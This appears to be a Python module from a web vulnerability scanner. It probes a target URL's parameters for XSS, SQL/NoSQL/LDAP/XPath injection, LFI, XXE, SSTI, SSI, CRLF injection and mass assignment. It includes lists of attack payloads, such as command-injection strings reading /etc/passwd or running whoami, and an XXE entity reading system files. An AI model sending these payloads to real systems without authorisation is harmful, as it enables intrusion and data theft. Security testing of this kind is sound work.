import requests
from bs4 import BeautifulSoup
import html
from typing import List, Dict, Union, Any
import re
from .utils import replace_or_append_param

def scan_reflected_xss(url: str, param: str, payload: str = "<script>alert(1)</script>") -> Dict[str, Any]:
    """Checks if a payload is reflected in the response body."""
    try:
        # Construct URL with payload
        target = replace_or_append_param(url, param, payload)

        response = requests.get(target, timeout=5)
        if payload in response.text:
            return {"status": "vulnerable", "message": f"Potential Reflected XSS found on parameter '{param}'"}
        return {"status": "safe", "message": "Payload not reflected verbatim"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_imap_smtp_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for IMAP/SMTP Injection by injecting CRLF and SMTP headers.
    """
    payloads = [
        "%0d%0aCc: victim@example.com",
        "%0d%0aBcc: victim@example.com",
        "%0d%0aRCPT TO: victim@example.com"
    ]
    try:
        for payload in payloads:
            target = replace_or_append_param(url, param, payload)
            res = requests.get(target, timeout=5)

            # Check if injected headers are reflected (Basic Check)
            # In a real scenario, this would check if the email was sent or if the server responded with an error indicating header processing.
            # Here we look for reflection or specific error messages.
            if "Cc:" in res.text or "RCPT TO" in res.text:
                 return {"status": "vulnerable", "message": f"Potential IMAP/SMTP Injection detected with payload: {payload}"}

        return {"status": "safe", "message": "No obvious IMAP/SMTP injection indicators found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_overflow_vulnerability(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for potential buffer overflow by sending a very long string.
    """
    try:
        # Generate a long string
        payload = "A" * 5000
        target = replace_or_append_param(url, param, payload)

        res = requests.get(target, timeout=5)

        # Check for 500 error or crash indicators
        if res.status_code == 500:
             return {"status": "warning", "message": "Server returned 500 Internal Server Error with long payload (Potential Overflow)"}

        return {"status": "safe", "message": f"Server handled long payload (Status: {res.status_code})"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_nosql_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for NoSQL Injection vulnerabilities (MongoDB).
    """
    try:
        # Baseline
        base_url = replace_or_append_param(url, param, "valid")
        base_res = requests.get(base_url, timeout=5)

        # Injection: [$ne]=wontmatch
        # We use the key "param[$ne]" to simulate object injection
        # Note: replace_or_append_param handles the key literally, which is what we want for URL encoding
        target = replace_or_append_param(url, f"{param}[$ne]", "wontmatch")

        # We might also want to ensure the original 'param' is removed to avoid conflict?
        # But replace_or_append_param only affects the key passed.
        # For now, appending the operator is the standard way tools do this if they don't fully parse.
        # Ideally we should remove 'param' if we inject 'param[$ne]'.
        # But let's stick to appending the injection key which effectively adds it to the query.

        inj_res = requests.get(target, timeout=5)

        # Heuristic: If response length differs significantly from baseline or errors, might be vulnerable
        # If injected response is significantly different length than baseline (indicating it processed the object)
        diff = abs(len(inj_res.text) - len(base_res.text))

        if diff > 50 and inj_res.status_code == 200: # Arbitrary
             return {"status": "vulnerable", "message": "Response changed with NoSQL operator injection"}

        if "MongoError" in inj_res.text:
             return {"status": "vulnerable", "message": "MongoDB Error detected"}

        return {"status": "safe", "message": "No obvious NoSQLi reaction"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_mass_assignment(url: str, baseline_params: Dict[str, Any], privileged_params: Dict[str, Any] = None) -> Dict[str, Any]:
    """
    Checks for Mass Assignment by injecting privileged parameters.
    """
    if privileged_params is None:
        privileged_params = {'role': 'admin', 'isAdmin': 'true', 'superuser': '1'}

    try:
        # Baseline request
        res_base = requests.post(url, data=baseline_params, timeout=5)

        # Injected request
        injected_params = baseline_params.copy()
        injected_params.update(privileged_params)

        res_inj = requests.post(url, data=injected_params, timeout=5)

        # Check if privileged params are reflected in response text (e.g. "role": "admin")
        # that wasn't in baseline
        found = []
        for k, v in privileged_params.items():
            if v in res_inj.text and v not in res_base.text:
                found.append(k)

        if found:
             return {"status": "vulnerable", "message": f"Potential Mass Assignment: {found} reflected or accepted"}

        return {"status": "safe", "message": "No privileged parameters reflected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_code_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for Server-Side Code Injection (PHP/Python/etc).
    """
    payloads = [
        "phpinfo()",
        "system('id')",
        "import os; os.system('id')",
        "print(1337*1337)"
    ]
    try:
        for payload in payloads:
            target = replace_or_append_param(url, param, payload)
            res = requests.get(target, timeout=5)

            if "PHP Version" in res.text:
                 return {"status": "vulnerable", "message": "PHP Info exposed (Code Execution)"}
            if "uid=" in res.text and "gid=" in res.text:
                 return {"status": "vulnerable", "message": "System command executed (uid/gid found)"}
            if "1787569" in res.text: # 1337*1337
                 return {"status": "vulnerable", "message": "Code evaluation detected (Math result found)"}

        return {"status": "safe", "message": "No code injection indicators found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_expression_language_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for Expression Language (EL) Injection.
    """
    payload = "${7*7}"
    try:
        target = replace_or_append_param(url, param, payload)
        res = requests.get(target, timeout=5)

        if "49" in res.text and "${7*7}" not in res.text:
             return {"status": "vulnerable", "message": "EL Injection detected (Math evaluated)"}
        return {"status": "safe", "message": "No EL injection detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_xquery_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for XQuery Injection.
    """
    payload = "' or 1=1 or ''='"
    # Generic injection similar to SQLi but for XML
    try:
        target = replace_or_append_param(url, param, payload)
        res = requests.get(target, timeout=5)

        # Look for XQuery specific errors
        errors = ["XQueryException", "Saxon", "saxon:compile"]
        for err in errors:
            if err in res.text:
                 return {"status": "vulnerable", "message": f"XQuery Error detected: {err}"}
        return {"status": "safe", "message": "No XQuery errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_null_session_cookie(response: Any) -> Dict[str, Any]:
    """
    Manually checks for session cookies in headers if not automatically parsed.
    """
    try:
        # response should be a requests.Response object
        headers = response.headers
        cookie_header = headers.get('Set-Cookie', '')

        common_names = ['PHPSESSID', 'JSESSIONID', 'ASPSESSIONID', 'SID', 'session']
        found = []

        for name in common_names:
            if name in cookie_header:
                found.append(name)

        if found:
             return {"status": "info", "message": f"Session cookies found in headers: {found}", "cookies": found}
        return {"status": "safe", "message": "No common session cookies found in Set-Cookie header"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_sql_error(url: str, param: str) -> Dict[str, Any]:
    """Checks for common SQL error messages."""
    payload = "'"
    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL query failed"
    ]
    try:
        target = replace_or_append_param(url, param, payload)

        response = requests.get(target, timeout=5)
        for err in errors:
            if err in response.text:
                return {"status": "vulnerable", "message": f"Potential SQL Injection Error detected: {err}"}
        return {"status": "safe", "message": "No common SQL errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_open_redirect(url: str, param: str, target: str = "http://example.com") -> Dict[str, Any]:
    try:
        test_url = replace_or_append_param(url, param, target)

        response = requests.get(test_url, allow_redirects=False, timeout=5)
        if response.status_code in [301, 302, 307, 308]:
            loc = response.headers.get('Location', '')
            if target in loc:
                return {"status": "vulnerable", "message": f"Potential Open Redirect on parameter '{param}'"}
        return {"status": "safe", "message": "No redirect detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_xss_payloads() -> Dict[str, Any]:
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ]
    return {"status": "success", "payloads": payloads}

def generate_sqli_payloads() -> Dict[str, Any]:
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3 --",
        "sleep(5) --"
    ]
    return {"status": "success", "payloads": payloads}

def generate_lfi_payloads() -> Dict[str, Any]:
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    return {"status": "success", "payloads": payloads}

def identify_input_params(url: str) -> Dict[str, Any]:
    """Extracts input names from forms."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        params = [i.get('name') for i in inputs if i.get('name')]
        return {"status": "success", "params": list(set(params))}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_http_verb_tampering(url: str) -> Dict[str, Any]:
    """Checks if other verbs are accepted."""
    verbs = ['HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    results = {}
    try:
        for verb in verbs:
            res = requests.request(verb, url, timeout=5)
            results[verb] = res.status_code
        return {"status": "success", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def basic_html_encoding(text: str) -> Dict[str, Any]:
    try:
        encoded = html.escape(text)
        return {"status": "success", "encoded": encoded}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def basic_html_decoding(text: str) -> Dict[str, Any]:
    try:
        decoded = html.unescape(text)
        return {"status": "success", "decoded": decoded}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_xml_rpc(url: str) -> Dict[str, Any]:
    try:
        if not url.endswith('/'): url += '/'
        res = requests.post(url + "xmlrpc.php", data="test", timeout=5)
        if res.status_code == 200 and "XML-RPC server accepts POST requests only" in res.text:
            return {"status": "detected", "message": "XML-RPC enabled"}
        return {"status": "not_detected", "message": "XML-RPC likely disabled or not found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_local_file_inclusion_heuristic(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for LFI by trying to access common files.
    """
    payloads = [
        "../../../../etc/passwd",
        "c:\\windows\\win.ini"
    ]
    try:
        for payload in payloads:
            target = replace_or_append_param(url, param, payload)
            res = requests.get(target, timeout=5)

            if "root:x:0:0" in res.text or "[extensions]" in res.text:
                return {"status": "vulnerable", "message": f"LFI detected with payload: {payload}"}

        return {"status": "safe", "message": "No obvious LFI detected with standard payloads"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def detect_base64(text: str) -> Dict[str, Any]:
    import base64
    try:
        if len(text) % 4 == 0 and re.match('^[A-Za-z0-9+/]+={0,2}$', text):
            base64.b64decode(text, validate=True)
            return {"status": "detected", "is_base64": True}
        return {"status": "not_detected", "is_base64": False}
    except:
        return {"status": "not_detected", "is_base64": False}

def check_stack_trace_exposure(text: str) -> Dict[str, Any]:
    indicators = [
        "Traceback (most recent call last)",
        "System.Exception",
        "at java.lang.Thread.run",
        "Warning: include(",
        "Fatal error:"
    ]
    found = [ind for ind in indicators if ind in text]
    if found:
        return {"status": "vulnerable", "traces_found": found}
    return {"status": "safe", "message": "No stack trace indicators found"}

def generate_cmd_injection_payloads() -> Dict[str, Any]:
    payloads = [
        "; cat /etc/passwd",
        "| whoami",
        "`whoami`",
        "jules",
        "&& dir"
    ]
    return {"status": "success", "payloads": payloads}

def generate_ldap_payloads() -> Dict[str, Any]:
    payloads = [
        "*",
        "*)(uid=*))(|(uid=*",
        "*()|&'",
        "admin*)((|userpassword=*)",
        ")(|(uid=*)"
    ]
    return {"status": "success", "payloads": payloads}

def generate_xml_payloads() -> Dict[str, Any]:
    payloads = [
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>"
    ]
    return {"status": "success", "payloads": payloads}

def generate_ssti_payloads() -> Dict[str, Any]:
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ]
    return {"status": "success", "payloads": payloads}

def check_json_response(url: str) -> Dict[str, Any]:
    try:
        res = requests.get(url, timeout=5)
        res.json()
        return {"status": "success", "message": "Returns Valid JSON"}
    except:
        return {"status": "failure", "message": "Not JSON"}

def check_api_docs(url: str) -> Dict[str, Any]:
    paths = ['/swagger.json', '/api/docs', '/docs', '/redoc', '/openapi.json']
    found = []
    if not url.endswith('/'): url += '/'
    for p in paths:
        try:
            res = requests.head(url.rstrip('/') + p, timeout=3)
            if res.status_code == 200:
                found.append(p)
        except:
            pass
    if found:
        return {"status": "found", "docs": found}
    return {"status": "not_found", "message": "No API docs found"}

def test_xxe_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Simulates XXE injection attempt.
    """
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

    try:
        # Assuming we POST XML data
        res = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=5)
        if "root:x:0:0" in res.text:
             return {"status": "vulnerable", "message": "XXE payload reflected /etc/passwd content"}
        return {"status": "safe", "message": "No obvious XXE reflection"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def test_xpath_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for XPath Injection errors.
    """
    payload = "' or '1'='1"
    try:
        target = replace_or_append_param(url, param, payload)
        res = requests.get(target, timeout=5)

        errors = ["XPathException", "System.Xml.XPath", "SimpleXMLElement"]
        for err in errors:
            if err in res.text:
                 return {"status": "vulnerable", "message": f"XPath error detected: {err}"}
        return {"status": "safe", "message": "No XPath errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def test_ssi_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for Server Side Include (SSI) injection.
    """
    payload = "<!--#exec cmd=\"ls\" -->"
    try:
        target = replace_or_append_param(url, param, payload)
        res = requests.get(target, timeout=5)

        # Look for file listing or common output
        if "bin" in res.text and "etc" in res.text:
             return {"status": "vulnerable", "message": "Possible SSI Execution detected (File listing indicators found)"}

        if payload in res.text:
             return {"status": "safe", "message": "Payload reflected verbatim (Likely not executed)"}
        return {"status": "safe", "message": "Payload not reflected and no execution indicators found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_http_splitting(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for HTTP Response Splitting (CRLF Injection).
    """
    try:
        # Payload injects a header
        payload = "%0d%0aX-Injected-Header: test"
        target = replace_or_append_param(url, param, payload)

        res = requests.get(target, timeout=5)

        # Check if header appears in response headers
        if 'X-Injected-Header' in res.headers:
             return {"status": "vulnerable", "message": "CRLF Injection successful: Header injected"}
        return {"status": "safe", "message": "Header not injected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_parameter_pollution(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for HTTP Parameter Pollution (HPP) vulnerabilities.
    """
    try:
        # Test case: param=1&param=2
        val1 = "12345"
        val2 = "67890"

        if '?' in url:
            target = f"{url}&{param}={val1}&{param}={val2}"
        else:
            target = f"{url}?{param}={val1}&{param}={val2}"

        res = requests.get(target, timeout=5)

        # Analyze reflection (Basic heuristic)
        if val1 in res.text and val2 in res.text:
            return {"status": "info", "message": "Both parameters reflected (Concatenation or both used)"}
        elif val1 in res.text:
            return {"status": "info", "message": "First parameter reflected (Precedence: First)"}
        elif val2 in res.text:
            return {"status": "info", "message": "Second parameter reflected (Precedence: Last)"}
        else:
            return {"status": "safe", "message": "No obvious reflection of pollution parameters"}

    except Exception as e:
        return {"status": "error", "message": str(e)}
